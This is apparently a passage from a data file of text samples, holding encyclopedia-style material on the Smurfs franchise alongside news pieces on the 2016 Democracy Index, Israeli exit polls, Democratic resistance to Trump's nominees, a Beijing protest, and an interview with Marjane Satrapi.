on both feet. They love to eat sarsaparilla (a species of Smilax) leaves, whose berries the Smurfs naturally call \"smurfberries\" (the smurfberries appear only in the cartoon; in the original comics, the Smurfs only eat the leaves from the sarsaparilla).\n\nThe Smurfs fulfill simple archetypes of everyday people: \"Lazy Smurf\", \"Grouchy Smurf\", \"Brainy Smurf\", and so on. All Smurfs, with the exception of Papa, Baby, Smurfette, Nanny and Grandpa, are said to be 100 years old. There were originally 99 Smurfs, but this number increased as new Smurf characters appeared, such as Sassette and Nanny. All of the original Smurfs were male; later female additions are Smurfette and Sassette—Smurfette being Gargamel's creation, while Sassette was created by the Smurflings.\n\nLanguage\n\nA characteristic of the Smurf language is the frequent use of the undefinable word \"smurf\" and its derivatives in a variety of meanings. The Smurfs frequently replace both nouns and verbs in everyday speech with the word \"smurf\": \"We're going smurfing on the River Smurf today.\" When used as a verb, the word \"Smurf\" typically means \"to make\", \"to be\", \"to like\", or \"to do\".\n\nHumans have found that replacing ordinary words with the term \"smurf\" at random is not enough: in one adventure, Peewit explains to some other humans that the statement \"I'm smurfing to the smurf\" means \"I'm going to the wood\", but a Smurf corrects him by saying that the proper statement would be \"I'm smurfing to the smurf\"; whereas what Peewit said was \"I'm warbling to the dawn\". So \"I'm smurfing to the smurf\" is not the same as \"I'm smurfing to the smurf\".[8]\n\nIn the animated series, only some words (or a portion of the word) are replaced with the word \"smurf\". Context offers a reliable understanding of this speech pattern, but common vocabulary includes remarking that something is \"just smurfy\" or in some cases, \"smurftastic\".\n\nIn Schtroumpf vert et vert Schtroumpf (see Smurf Versus Smurf), published in Belgium in 1972, it was revealed that the smurf village was divided between North and South, and that the Smurfs on either side had different ideas as to how the term \"smurf\" should be used: for instance, the Northern Smurfs called a certain object a \"bottle smurfer\", while the Southern Smurfs called it a \"smurf opener\". This story is considered a parody on the still ongoing taalstrijd (language war) between French- and Dutch-speaking communities in Belgium.[9]\n\nSmurf village\n\nWhen they first appeared in 1958, the Smurfs lived in a part of the world called \"Le Pays Maudit\" (French for \"the Cursed Land\"). To reach it required magic or travelling through dense forests, deep marshes, a scorching desert and a high mountain range.[10] The Smurfs themselves use storks in order to travel long distances, such as to the kingdom where Johan and Pirlouit live, and keep up-to-date with events in the outside world.[11]\n\nIn the Johan et Pirlouit stories, the Smurf village is made up of mushroom-like houses of different shapes and sizes in a desolate and rocky land with just a few trees. However, in the Smurf series itself, the mushroom-like houses are more similar to one another and are located in a clearing in the middle of a deep forest with grass, a river, and vegetation. Humans such as Gargamel are shown to live nearby, though it is almost impossible for an outsider to find the Smurf village except when led by a Smurf.\n\nSmurf economy\n\nThe Smurfs' community generally takes the form of a cooperative, sharing, and kind environment based on the principle that each Smurf has something they are good at, and thus contributes it to Smurf society as they can. In return, each Smurf appears to be given their necessities of life, from housing and clothes to food without using any money in exchange.\n\nCharacters\n\nPapa Smurf is the leader of the community. Other Smurfs are generally named after their personality disposition, much like Disney's Seven Dwarfs; for example, Brainy, Greedy, Vanity, Lazy, Clumsy, Hefty, Jokey, Dreamy, Grouchy, or their profession, for example, Poet, Actor, Handy, Harmony, Farmer, Clockwork, Painter, Tailor, Miner, Architect, Reporter, Timber, Barber and Doctor Smurf. The first female Smurf, Smurfette, was created by Gargamel to lure the other Smurfs. Papa Smurf then changed her into what we see today. The non-Smurf characters who would appear later would include their enemies the wizard Gargamel, his cat Azrael, an ugly witch, Hogatha and Gargamel's godfather Balthazar; and their friends the page Johan and his young friend Peewit and the wizard Homnibus. There are 105 Smurfs.\n\nSmurf comics\n\nSince the first appearance of the Smurfs in Johan et Pirlouit in 1958, 31 Smurf comics volumes have been created, 16 of them by Peyo, the others by his studio. Originally, the Smurf stories appeared in Spirou magazine with reprints in many different magazines, but after Peyo left the publisher Dupuis, many comics were first published in dedicated Smurf magazines, which existed in French, Dutch, German and Turkish. A number of short stories and one page gags have been collected into comic books next to the regular series of 30 including a newly released Smurfs comics enitiled Les Schtroumpfs de L'ordre (The Order Law of the Smurfs). English translations have been published in the U.S. by the graphic novel publisher Papercutz as well as a mini series published by Marvel Comics in the mid-1980s.\n\nOther media\n\nMotion pictures\n\nIn 1965, a black-and-white 87-minute animated film called Les Aventures des Schtroumpfs was released in theatres in Belgium. It consisted of five short cartoons made in the previous years for broadcasting on Walloon TV. German copies and copies with Dutch subtitles are known to exist. The stories were based on existing Smurf stories like The Black Smurfs and The Smurfs and the Egg, and were created by writer Maurice Rosy and artist Eddy Ryssack from the small Dupuis animation studios.[12] In total, ten animated shorts were created between 1961 and 1967, the first series in black and white and the later ones in colour.\n\nIn 1976, La Flûte à six schtroumpfs (an adaptation of the original \"Johan et Pirlouit\" story) was released. Michel Legrand provided the musical score to the film. The film would be released in the United States in 1983 (after the animated series became popular there) in an English language dubbed version titled The Smurfs and the Magic Flute. A few more full-length Smurf films were made, most notably The Baby Smurf and Here are the Smurfs,[13] created from episodes of the Hanna-Barbera television cartoon series.\n\nSony Pictures has announced plans to begin a trilogy of live-action/computer-animated Smurf films, with the first film released on July 29, 2011.[14] The project had been in various stages of development since 2003.[15] In June 2008, it was announced that Columbia Pictures and Sony Pictures Animation had acquired film rights from Lafig Belgium. Jordan Kerner produced the film, with the screenwriters including Shrek 2 and Shrek the Third screenwriters J. David Stem and David N. Weiss.[16][17] The film stars Jonathan Winters as Papa Smurf, Katy Perry as Smurfette, George Lopez as Grouchy Smurf, Gary Basaraba as Hefty Smurf, John Oliver as Vanity Smurf, Alan Cumming as Gutsy Smurf, Paul Reubens as Jokey Smurf, Hank Azaria as Gargamel, Neil Patrick Harris as Patrick Winslow and Jayma Mays as Grace Winslow, a couple in New York who help the Smurfs get back to their village. It was suggested that Quentin Tarantino would play Brainy Smurf, but this \"didn't work out\" so Fred Armisen voices Brainy instead.[18] A CGI/traditionally animated mini-film, titled The Smurfs: A Christmas Carol, was released on December 2, 2011, on The Smurfs DVD and Blu-ray.[19] A sequel to The Smurfs, titled The Smurfs 2, was released on July 31, 2013.[20] A fully animated Smurfs reboot film, Smurfs: The Lost Village, was released in April 7, 2017, with Demi Lovato starring as Smurfette.[21]\n\nTelevision series\n\nThe Smurfs secured their place in North American pop culture in 1981, when the Saturday-morning cartoon series The Smurfs, produced by Hanna-Barbera Productions in association with SEPP International S.A.R.L, aired on NBC from September 12, 1981 to December 2, 1989 (reruns until August 25, 1990). The show continued to air on the USA network until 1993, and on Cartoon Network until 2003. The Smurfs is still broadcast on the Boomerang channel throughout the United States. The show became a major success for NBC, spawning spin-off television specials on an almost yearly basis. The Smurfs was nominated multiple times for Daytime Emmy awards, and won Outstanding Children's Entertainment Series in 1982–1983.[15] The Smurfs television show enjoyed continued success until 1990, when, after nearly a decade of success, NBC cancelled it due to decreasing ratings and plans to extend their Today morning show franchise to create a Saturday edition, although they did not do so until 1992 (two years later). The decreased ratings were the result of the network changing the format of the show, resulting in the final season featuring regular time travel with only a few Smurfs.\n\nIn the TV series, many classical masterpieces are used as background music during the episodes, among them Franz Schubert's Unfinished Symphony (Symphony No. 8 in B minor), Edvard Grieg's Peer Gynt and Modest Mussorgsky's Pictures at an Exhibition.[22] Reruns of the show are played on the Cartoon Network's sister channel Boomerang.\n\nThe Smurfs was named the 97th best animated series by IGN. It was called \"kiddie cocaine\" for people growing up during the 1980s.[23]\n\nOn August 31, 2017 it was announced that IMPS and Dupuis Audiovisuel would be working on the new Smurfs TV series with CGI animation.[24][25][26]\n\nDVD releases\n\nOn February 26, 2008, Warner Home Video released Season 1 Volume 1 on DVD, containing the first 19 episodes. On October 7, 2008, Warner Bros. released Season 1 Volume 2 on DVD, containing the remaining 20 episodes from season 1. Though Warner Bros. has decided to discontinue the season sets and release single-disc volume sets instead, they are reportedly still following the correct order of episodes.[citation needed]\n\nMagna Home Entertainment in Australia has released a 9-disc 50th Anniversary Collection, containing a total of 52 episodes[citation needed]. In September 2009, a Smurfette-themed collection containing 25 episodes was made available followed by the \"Papa Smurf Collection\" in December 2009 containing 26 themed episodes.[27] In July 2010, both the Smurfette and Papa Smurf Collection were included in a special 'Favourites Collection'.[28] Also releasing at the same time was the Smurfs very first feature film (produced in 1975), The Smurfs and the Magic Flute, available for the first time on DVD, in Australia.[29]\n\nNovember 3, 2010 witnessed the release of two \"Just Smurfy\" collections, each featuring episodes not yet released on DVD to the Australian market.[30][31] December 3, 2010 saw the 3rd collection hit the market.[32] A fourth Just Smurfy set was planned for release on March 2, 2011.[33]\n\nMagna Home Entertainment in Australia have released Season 1[34] & Season 2[35] on August 24, 2011. Season 3[36] and Season 4[37] released October 5, 2011. A limited edition 'Ultimate Collection 1'[38] which features the first 5 seasons was released on August 24, 2011. A 'Ultimate Collection 2'[39] which features Season 6 – Season 9 was released on November 2, 2011.\n\nThe show is being released on DVD in the UK through a joint conjunction with Arrow Films and Fabulous Films Ltd. The complete 1st season was released in a 4 Disc box set on July 5, 2010. Season 2 was released on September 6, 2010, Seasons 3, 4 and 5 was released on July 1, 2013 and the original Smurfs feature film, The Smurfs and The Magic Flute, was released on DVD and Blu-ray on October 11, 2010.\n\nCrossovers\n\nPapa Smurf, Hefty Smurf, and Brainy Smurf appeared in the cartoon crossover Cartoon All Stars to the Rescue along with Bugs Bunny and Daffy Duck (from the Looney Tunes franchise), Huey, Dewey and Louie (from DuckTales), Winnie the Pooh and Tigger, Alvin and the Chipmunks, the Muppet Babies (Kermit, Piggy and Gonzo respectively), Slimer (from The Real Ghostbusters), ALF, Michelangelo (from Teenage Mutant Ninja Turtles). Smurfette appeared on the promotional poster, but never[clarification needed] appeared in the actual film.\n\nMerchandising\n\nFrom 1959 until the end of the 1960s, Dupuis produced Smurf figurines. But the best known and most widely available Smurf figurines are those made by Schleich, a German toy company. Most of the Smurf figurines given away as promotional material (e.g. by National Garages in the 1970s and McDonald's in the 1990s) are also made by Schleich.\n\nNew Smurf figures continue to appear; in fact, only in two years since 1969 (1991 and 1998) have no new Smurfs entered the market. Schleich currently produces 8 to 12 new figurines a year. Over 300 million of them have been sold so far.[15]\n\nOther Smurf figurines have been created for advertising purposes, e.g. worldwide for McDonald's and Kinder Surprise, or nationally for e.g. Albert Heijn in the Netherlands, and Delhaize in Belgium.\n\nSpecial Smurf comics were often created for advertising campaigns. This started in the 1960s for Kwatta and Kellogg's, and later for companies like BP in the UK and Australia, or Benco (a Dutch chocolate drink).[40] These comics were often only part of a larger campaign, e.g. the Benco comics were accompanied by a TV ad.[41]\n\nA Smurf balloon/float/Falloon (which is half float half balloon) continues to be presented in holiday parades such as Macy's Thanksgiving Day Parade.[42]\n\nSmurfs had two cereals in the 1980s made by Post Cereals: Smurf-Berry Crunch cereal and Smurfs Magic Berries. Both had animated commercials on Saturday morning. Two Smurfs pastas, made by Chef Boyardee and DelVerde were made in the 1980s, as well. Also Libby's & Heinz came out with Smurf-A-Getti canned pasta for the American and Canadian market.\n\nThe Smurfs had a commercial in the 1980s for the Mexican snack cake company Marinela Submarinos with a rare version of Smurfette (Pitufina) dressed in a red dress and her hair done in pigtails.\n\nMusic recordings\n\nOver the decades, many singles and albums of Smurf music have been released in different countries and languages, sometimes very successfully, with millions of copies sold. The best known is the single The Smurf Song and its accompanying album, created by Dutch musician Pierre Kartner who sings under the alias Father Abraham, which reached the #1 position in 16 countries. Worldwide, more than 10 million CDs with Smurf music have been sold between 2005 and 2007 alone.[15]\n\nIn 1989, I.M.P.S and R-Tek Music, International created Smurfin!: Tenth Anniversary Commemorative Album, released by Quality Special Products in Canada and The US and Dino Music in Australia. It was also released in parts of Europe. The Album came out on LP, CD and cassette. The LP featured 20 tracks (The Canadian CD and cassette had 16, the American CD had 10). The songs were covers of popular songs like Surfin' U.S.A., Kokomo, The Lion Sleeps Tonight and I Think We're Alone Now, as well as two original songs.\n\nSmurfs on Ice\n\nFor several years, the Smurfs were the children's act in the Ice Capades travelling ice show. After they were retired from that function, the Smurf suits from the show were issued to Ice Capades Chalets, the show's subsidiary chain of ice rinks, lasting until the show was sold to a group of investors led by Dorothy Hamill. The Chalets were sold to Recreation World. The Smurfette suit in particular had a somewhat different hairstyle from what was portrayed in the Hanna-Barbera cartoons.\n\nSmurfs in theme parks\n\nIn 1984, the Smurfs began appearing in North American theme parks owned by Kings Entertainment Corporation. Each park featured a Smurf attraction and Smurf walk-around figures. Canada's Wonderland had an entire Smurf village to walk through, ending with Gargamel's Castle. \"The Smurfs' Enchanted Voyage\" was located in Kings Island. Kings Dominion has \"Smurf Mountain\". California's Great America featured a pint-sized steel coaster, \"The Blue Streak\". Carowinds had an artificial island that was named Smurf Island that had a Smurf village—including toadstool houses which could be entered. Hanna–Barbera Land had a Smurf district.\n\nIn 1989, in the France region of Lorraine, the Sorépark group opened a complete Smurfpark, named Big Bang Schtroumpf. In 1991, the park was bought by the successful Belgian Walibi Group and renamed Walibi Schtroumpf with new attractions. After the Walibi Group was acquired by Six Flags, the park was named Walibi Lorraine, and all the Smurfs references in the park were removed in 2003.\n\nComics Station, Motiongate Dubai, Movie Animation Park Studios and Dream Island feature Smurf sections.\n\nVideo games\n\nThe Smurfs have appeared in video games made for most major game consoles (including Nintendo's NES, Super NES, and Game Boy systems, Atari, ColecoVision, Sega's Game Gear, Master System, Mega Drive and Mega CD systems, and the original Sony PlayStation) and for the PC. In 2010, the Smurfs expanded into the world of apps for Android, the iPad, iPhone, and iPod Touch with the game Smurf Village.\n\nGame titles\n\nUNICEF\n\nIn 2005, an advertisement featuring the Smurfs was aired in Belgium in which the Smurf village is annihilated by warplanes.[44] Designed as a UNICEF advertisement, and with the approval of the family of the Smurfs' late creator Peyo, the 25-second episode was shown on the national television after the 9 p.m. timeslot to avoid children having to see it. It was the keystone in a fund-raising campaign by UNICEF's Belgian arm to raise money for the rehabilitation of former child soldiers in Burundi and the Democratic Republic of the Congo—both former Belgian colonies.\n\nIn honour of their 50th anniversary in 2008, the Smurfs began a year-long \"Happy Smurfday Euro Tour\" in connection with UNICEF. The Smurfs visited fifteen European countries on the day of their 50th \"Smurfday\" in the form of publicly distributed white figurines. The recipients could decorate and submit them to a competition. The results of this contest were auctioned off and raised a total amount of 124,700 euros for benefit of UNICEF.[45]\n\nCoins\n\nThe 50th anniversary of the Smurfs and the 80th anniversary of the birth of its creator Peyo, were celebrated by issuing a high-value collectors' coin: the Belgian 5 euro 50th anniversary of The Smurfs commemorative coin, minted in 2008.\n\nSociological discussion\n\nIn 1998, writer Marc Schmidt wrote a parody article citing the Smurfs as an example of the impact of socialism in continental European culture.[46][47] In 2011, Schmidt's essay was scrutinised in a response essay by Kate Krake, who examined the nature of cultural theory built on textual observation and warned against creating false allegories out of texts like The Smurfs.[48]\n\nFrench sociologist Antoine Buéno described them in a 2011 book as a totalitarian and racist utopia.[49] Studio Peyo head Thierry Culliford, the son of Peyo, dismissed Buéno's accusations as \"grotesque and frivolous\".[50]\n\nSee also",
  "latent_26386": "The election of populist candidates such as U.S. President Donald Trump, pictured at center during the parade marking his inauguration on Friday, January 20, 2017, is indicative of a general lack of trust in government and those elected to serve, according to researchers in a recent report on democratic practice around the world. Overall, the researchers found about double the number of nations improving their democracies backslid in doing so in 2016. Pool photo by Evan Vucci/UPI | License Photo\n\nJan. 26 (UPI) -- The United States is no longer a \"full democracy,\" according to a report released Wednesday that said the country has been on the slide for years as citizens trust the government and their elected officials less and less.\n\nThe United States was demoted from consideration as a \"full democracy\" to a \"flawed democracy\" in the 2016 Democracy Index, a measure of democratic function in countries around the world. The researchers cite the decline of democratic trust and process in the United States as endemic of a problem seen similarly around the world in 2016, when no country improved its average score in the report and nearly double the number of countries saw their scores go down as those seeing their score go up.\n\nThe report, titled Revenge of the Deplorables, points to the vote of Britons to leave the European Union and, especially, the election of President Donald Trump as signalling a global movement of populism having reached a boiling point of issues with the rule of global elites that have long persisted but not been solved.\n\n\"On the contrary, the election of Mr. Trump as U.S. president was in large part a consequence of the longstanding problems of democracy in the U.S.,\" Joan Hoey, editor of the report, told EurActiv.com, adding that \"the backlash was the culmination of a longstanding trend of deterioration in the quality of democracy in the U.S. and Europe. which is manifested in declining trust, falling popular participation and the erosion of civil liberties.\"\n\nRELATED Joe Biden warns of collapse of democracy at Davos\n\nThe report, prepared by The Economist Group, includes analysis of the governmental systems of 165 independent states and two territories, covering most of the world. The index is based on electoral process and pluralism, civil liberties, functioning of government, political participation and political culture. Governments are then classified as either full democracy, flawed democracy, hybrid regime or authoritarian regime.\n\nOverall, the report notes a global reduction in total democracy scores among all of the countries considered, with 72 experiencing some type of decline in their individual score, nearly twice the 38 which saw an improvement. The other 57 countries considered for the report saw their ratings stay the same. On top of this, all five regions of the world saw their overall democracy scores go down in 2016.\n\nThe report calls 19 nation-states a \"full democracy,\" one less than last year -- the difference being the United States moving to the group of 57 \"flawed democracies.\" Among flawed democracies, the United States comes in tied for second with Italy, just behind Japan.\n\n\"Trust in political institutions is an essential component of well-functioning democracies,\" researchers say in the report. \"Yet surveys by Pew, Gallup and other polling agencies have confirmed that public confidence in government has slumped to historic lows in the U.S.\"\n\nRather than blame Trump for the decline, the researchers say he benefited from long-term declines in trust in political institutions and parties, and the government itself, as has been seen in other developed countries of the world.",
  "latent_26461": "The Israeli election results are looking to be pretty good news for incumbent Prime Minister Benjamin Netanyahu, judging by an average of three exit polls released late on Tuesday. This chart, showing the number of seats each party is projected to hold in the Knesset, Israel's parliament, demonstrates why this is looking good for Netanyahu:\n\nThe boxed-in part of the chart represents the parties that would be most likely to form a coalition with Netanyahu. In the Israeli system, the next government is formed by creating a coalition of parties who together control 61 seats or more. In other words, this shows the most plausible coalition Netanyahu could organize to form a government and stay in power. And this scenario is pretty plausible indeed.\n\nAs this shows, Netanyahu could put together a government made up mostly of right-wing and ultra-Orthodox parties. This is ideologically not too difficult for him: the right-wing parties are his natural allies, and the ultra-Orthodox are much more comfortable with the right than the center-left on issues such as the peace process and synagogue-state relations.\n\nThere is one caveat: Netanyahu would also need Kulanu, a center-right party headed by former Likud minister Moshe Kahlon. Kulanu has been critical of Likud's performance on the economy and US-Israel relations. It still appears open to joining a coalition, but it is a wild card.\n\nBy contrast, the most viable opposition, Isaac Herzog's center-left Zionist Union, would have a much tougher time forming a coalition. They'd need Kulanu as well as the other centrist party, Yesh Atid, and at least one ultra-Orthodox party — specifically Shas, the slightly larger one.\n\nThe problem for Zionist Union is that they'd likely need both Yesh Atid, which is staunchly secular, as well as one of the ultra-Orthodox parties, which despise Yesh Atid. As you can see, forming a center-left government would, based on these exit numbers, be really difficult and complex. Forming a right-wing government built around Likud wouldn't be a cinch, but it would be easier.",

Video provided by Newsy Newslook\n\nProtesters demonstrate as Senate Minority Leader Chuck Schumer and House Minority Leader Nancy Pelosi lead members of Congress during a protest on the steps of the U.S. Supreme Court on Jan. 30, 2017. (Photo11: Win McNamee, Getty Images)\n\nWASHINGTON — Twelve days into the new administration, Democrats in Congress are forming an especially fierce wall of opposition to President Trump’s nominees and agenda powered by grass-roots protests in the streets of major U.S. cities and a flood of constituent phone calls, emails and letters.\n\nSen. Bob Casey, D-Pa., has received at least 80,000 angry letters and other correspondence — and that’s just about Trump’s Education secretary pick, Betsy DeVos. On Monday, more than 800 callers jammed West Virginia Sen. Joe Manchin’s phone lines; 97% expressed opposition to Trump’s travel ban targeting majority Muslim nations and his Cabinet picks of DeVos and Sen. Jeff Sessions as attorney general.\n\nSen. Heidi Heitkamp of North Dakota, a Democrat representing another conservative-leaning state, cited 1,400 people, 95% of them opposed to DeVos, who recently contacted her office in announcing her plan to vote against the education pick.\n\nThis week, Democrats boycotted votes on Trump’s Treasury, Health and Human Services, and Environmental Protection Agency picks, Steve Mnuchin, Tom Price and Scott Pruitt, and blocked an initial vote on Sessions. They’re also making clear plans to filibuster Neil Gorsuch, his Supreme Court nominee, and blocking key pieces of his agenda.\n\nRead more:\n\n“The protests and the actions of Democratic senators are mirrors of each other,” Sen. Chris Murphy, D-Conn. “We are rising to what is a truly exceptional moment,” he said, while acknowledging his party's limits since the GOP controls the Senate floor.\n\n“There’s only so much we can do, but I’m prepared to shatter precedent in order to make it clear that we are not going to stand for what Trump is doing,\" said Murphy. In addition to standing by Trump’s travel ban, Senate Republican leaders are trying to “rush through” the nominations of Cabinet officials with thin résumés and potential conflicts of interest, including Mnuchin and DeVos, said Murphy.\n\nEmotion but not enough votes\n\nSince Democrats lack the votes to block most of Trump’s nominees, they need some Republicans to join them. Yet the show of resistance makes clear that one of the major selling points Trump made as a candidate — that he’s a non-ideological businessman who could make government work again — may be the toughest promise to keep. Senate Minority Leader Chuck Schumer, who initially said he hoped to cut deals with Trump on infrastructure, for instance, now appears to be spearheading the opposition.\n\nThe 2016 election, marked by personal insults and a harsh tone, turned off many voters, as studies show a smaller share of eligible voters cast ballots last year than in either of the two previous elections. On the Democratic side, some of the enthusiasm of progressives may have also been dampened as Sen. Bernie Sanders focused on Hillary Clinton’s past positions on international trade agreements and her ties to Wall Street.\n\nNow Trump appears to be accomplishing what no Democratic leader, including former president Barack Obama, could in the general election — by uniting Democrats. The backlash was immediate, with an estimated 3 million taking to the streets of major U.S. cities and overseas the day after Trump’s inauguration.\n\nA series of executive actions since then, including his travel ban and targeting of environmental standards, as well Trump's Supreme Court pick of Gorsuch, is feeding the fury of progressives taking to the streets. On Tuesday night, an estimated 5,000 gathered outside Schumer’s home in Brooklyn's Park Slope neighborhood as a planned “What the f--- Chuck?!” protest turned into a more of a rally after he took to Facebook to announce plans to block eight of Trump’s Cabinet picks.\n\nRead more:\n\n“It’s clear our country is at a crossroads,” said Schumer. “In his first week in office the president has stomped over our proud American tradition of welcoming immigrants and refugees, trafficked in alternative facts and is attempting to fill his Cabinet with billionaires and bankers,” he said.\n\nThe Working Families Party, along with MoveOn.org and People’s Action, have declared weekly ResistTrumpTuesdays; according to MoveOn, more than 10,000 took part in 200 rallies at congressional offices on Jan. 24, a showing that repeated on Tuesday of this week, including at least 2,000 in Lancaster, Pa.\n\n“It’s starting to amount to something,” said Working Families Party communications director Joe Dinkin. “There’s outside actions at offices of Democratic and Republican senators to push Democrats into a more oppositional posture and make Republicans feel the cost of their votes.”\n\nIncreased civic interest is also padding the coffers of interest groups including the American Civil Liberties Union, which raised $24 million in a single weekend, six times what it usually collects in an entire year.\n\n“I’ve never seen this degree of intensity. It’s phone calls and social media, people on the streets,” Casey said.\n\nRepublicans targeted, too\n\nRepublicans are also in the cross hairs. Alaska Sen. Lisa Murkowski announced she'll break with her party to oppose DeVos a day after Murkowski said during a Tuesday committee meeting that thousands have contacted her, including coming to her offices in Washington and Alaska, expressing worries about the school voucher advocate from Michigan. Sen. Cory Gardner, R-Colo., told CBS that his office “is getting so many calls and emails, his has staff assigned to do nothing except respond to them,” including 3,000 voice mails in one night.\n\nThe experiences of these members are backed up by data showing U.S. citizens make unprecedented use of social media tools, said Steve Patterson, chief executive of Broadnet, whose customers use video or audio streaming software to engage audiences.\n\nSen. Lisa Murkowski, R-Alaska, right, talks with the Sen. Maria Cantwell, D-Wash., on Capitol Hill on Jan. 19, 2017. (Photo11: Carolyn Kaster, AP)\n\n“I have never seen in my 13 years a citizenry more engaged and more willing to listen,” said Patterson. For instance, a recent MoveOn call that drew 60,000 participants, including online, shattered a Guinness World Record for the most people engaging in a single live conversation. “We didn’t have anybody there from Guinness to document it, but she broke the record,” he said.\n\n“It’s a myth that citizens’ voices don’t make a difference,” said Brad Fitch, president of the Congressional Management Foundation. “Surveys of congressional staff clearly show that constituent interactions are the most influential advocacy strategy citizens can employ,” he said.\n\nDemocratic lawmakers say they’re responding to individual constituent concerns, yet what appears to be a growing movement is also likely to have longer-term implications as the party reshapes in the aftermath of a dramatic Nov. 8 loss to Trump. Much like the Republican Tea Party played an outsized role in obstructing Obama’s agenda, Democrats now must demonstrate to the left wing of their party that they’re responsive to the demands of an empowered bloc of voters.\n\n“There are a lot of Democrats who are politically smart and understand there’s a tremendous amount of energy, and that’s where the future of the party is,” said Jeff Weaver, president of Our Revolution, the activist network that grew out of Sanders’ campaign to elevate progressive leaders. “They’re trying to align themselves that way.”\n\nTargeting Gorsuch\n\nThe Senate battle over confirming Gorsuch is sure to include fireworks, even if he's likely to win confirmation in the end. Democrats point to his positions on women’s reproductive health coverage, guns and the Affordable Care Act. Republicans say Democrats are transparently playing politics.\n\n“Some on the far left have decided to oppose Judge Gorsuch before he was even nominated,” Senate Majority Leader Mitch McConnell, R-Ky., said on the Senate floor. “The ink was not even dry.”\n\nPresident Trump and Supreme Court nominee Neil Gorsuch in the East Room of the White House on Jan. 31, 2017.

It was grand larceny,’” said Brad Woodhouse, president of Americans United for Change. “Democrats in the Senate, and progressives and liberals who care about the unprecedented nature of that theft by Republicans, shouldn’t roll over for Donald Trump.”\n\nNot all Democrats are in line with a blanket blockade. “It’s just not who I am,” said Manchin, who is nevertheless voting against DeVos.\n\nYet, of his Democratic colleagues, he said: “They have a right to do that. Republicans basically stonewalled everything” when Obama was in the White House.\n\nRead or Share this story: http://usat.ly/2jZ6LTQ",
  "latent_26677": "Hundreds of demonstrators demand full investigation into Anhui woman's fall from building and allegations that she was raped\n\nPolice and paramilitaries swarmed the area around a shopping centre in southern Beijing on Wednesday as hundreds of people mounted a protest over the death of a young woman.\n\nHelicopters flew overhead and dozens of police vans surrounded the scene at the Jingwen shopping mall in Fengtai district.\n\nThe unrest is thought to have begun because marchers believed police had not properly investigated the death of the woman, from Anhui, or claims that she had been raped before she fell from the building.\n\nProtests are becoming increasingly common across China, but authorities are particularly sensitive to such outbreaks in the capital.\n\nA shopkeeper who gave his name only as Mr Li said that some police had arrived at around 10am, followed by around 200 people who paraded down the street shouting \"Protest! Protest!\"\n\nThe rapidly growing number of officers then closed the road for the rest of the day, he said. Photographs of the scene posted online showed hundreds of people on the street, although it was not clear how many were protesters and how many were onlookers.\n\nOne bystander said that officers had clashed with protesters, beating them and dragging them into vans.\n\nOn the Sina Weibo microblogging service, the name of the bridge where the protests took place was being blocked, as was that of nearby Yongdingmen. But \"Anhui Girl\" was trending as a top-10 search term.\n\nOfficers at Fengtai police station declined to comment on the protest and said its propaganda office would give more details later.\n\nBeijing police posted a statement on their microblog in the early afternoon, saying the woman's death was under investigation.\n\nIt said she came to the shopping mall on the evening of 2 May and fell from the building at 5am the next day. It had not found she had contact with anyone during that time.",
  "latent_26764": "For her latest Our Shared Shelf book club choice, Emma Watson chats with author Marjane Satrapi about her groundbreaking autobiographical graphic novel, Persepolis_._\n\nEmma Watson: In Persepolis you show the relative freedom that women experienced in Iran in the 1970s compared to the strict laws that governed their behavior after the revolution. Do you think life is any easier for women now than it was when you were a child?\n\nMarjane Satrapi: According to the law, we had much more freedom because women could, for example, ask for a divorce. But when a woman is uneducated and is not actually economically independent, you can have all the rights to divorce that you want and it doesn’t make a huge difference. At the end of the day, you know, if you have three kids, no education, no job—what do you do? You don’t divorce; you have to stay with the same asshole all your life!\n\nToday the thing is that the laws are much more anti-women. However, at the same time, it seems that repeating over and over to women “you’re worth half of men, you’re worth half of men” has meant all these women actually go and study much more. So that today two-thirds—70 percent!—of students in Iran are girls.\n\nAnd so they’re playing a role in all of these domains. In the end, this means that when these girls and women marry, they will be more educated than their own father, their own husband, their own brother—and then they cannot give them shit! They can no longer tell them “You’re worth half of men,” you know?\n\nSo if women have the possibility of working for a living, they could actually manage to get a divorce. First you have to have economic independence of women, and then we can talk about the freedom of women. If women are educated, they will be economically independent and they will just accept less shit. That is the first step toward democracy.\n\nThe enemy of democracy isn’t one person. The enemy of democracy is patriarchal culture. As with the family, where the father of the family decides and has the last word, so a dictator is the father of the nation.\n\nIf we have more educated women, then we have more educated societies. This is without any “feminist prejudice”—it’s fact.\n\nI have to tell you that when I was a child, my mum used to tell me all the time: “Oh, you should never count on your face; count on your intelligence. I don’t care if you get married or not. I want you to study and to be economically independent.”\n\nNow, as a child I thought she was actually telling me: “You are extremely ugly, you are never going to make it. You shouldn’t even try to be cute . . . the cause is lost and no matter what, nobody is going to marry you so at least try to be bright!”\n\nEW: That’s how you interpreted it?!\n\nMS: Yes, absolutely. I talked to her about it when I was 28 and she, of course, told me I was very stupid to think like that.\n\nEW: But I guess now, understanding the context and time in which she was telling you that, it seems extraordinary that she was giving you this message. What do you think made your mother so empowered? Where did this empowered line of women from which you descended come from?\n\nMS: This has a lot to do with geography—you know, I come from the north of Iran. It’s an area where we plant rice, where the women work beside each other, bent over all day. So there is no division between genders.\n\nMy mother grew up in this place and she was very loved by her father and family. But you look around and you see a society that does not say that men and women are equal. That says it can’t use women for causes other than making children or sex. Women are actually using half of their capacity or less; half of their talents or less; half of their brains or less; half of their work or less. So this society works at half speed or less.\n\nBut she was a woman of the 1960s and 1970s, and she really didn’t want me to learn those ideas. I was brought up with the idea that “you are a human being.” They never told me “you are a girl” or “you are a boy.” They told me “anything that a human being can do, that is humanly possible, you can do.”\n\nAnd my parents were clear that the first thing you have to do is study and, if you study, you can do whatever you want. But if you don’t study, we’re going to give you shit! So the calculation was very easy because if I wanted to have peace and do whatever I wanted, I had to be good at school. And that is what I did.\n\nEW: I had that when I grew up as well—my mum was pretty laid-back about a lot of things, but I had to do well in school.\n\nMS: Also, I think that we blame lots of things on men and how nasty they are, but there is also the role of women. In a patriarchal culture, who are the ones that raise the children? It’s the women. It’s they who say: “You know, oh my girl, you have to be pretty. My son, you have all the rights,” et cetera. I have seen extremely patriarchal women and feminist men, so I don’t think it’s a question of gender. It’s a question of intelligence.\n\nAnd look at the female magazines, all the female magazines! I never read them because they are really horrible and very superficial. “How am I going to lose 10 pounds before summertime?” What if I don’t want to lose 10 pounds? Because you know the little crease that I have—I really love it. And what if I don’t want to have perfect skin, because I’m 45 years old and of course I am aging?\n\nBut is that really the fault of men? I don’t think so. That is our responsibility, and when we blame it on men, we always put ourselves in the situation of the victim. And we are not victims. We are human beings. We have our brain. Nobody can stop us from being gorgeous, 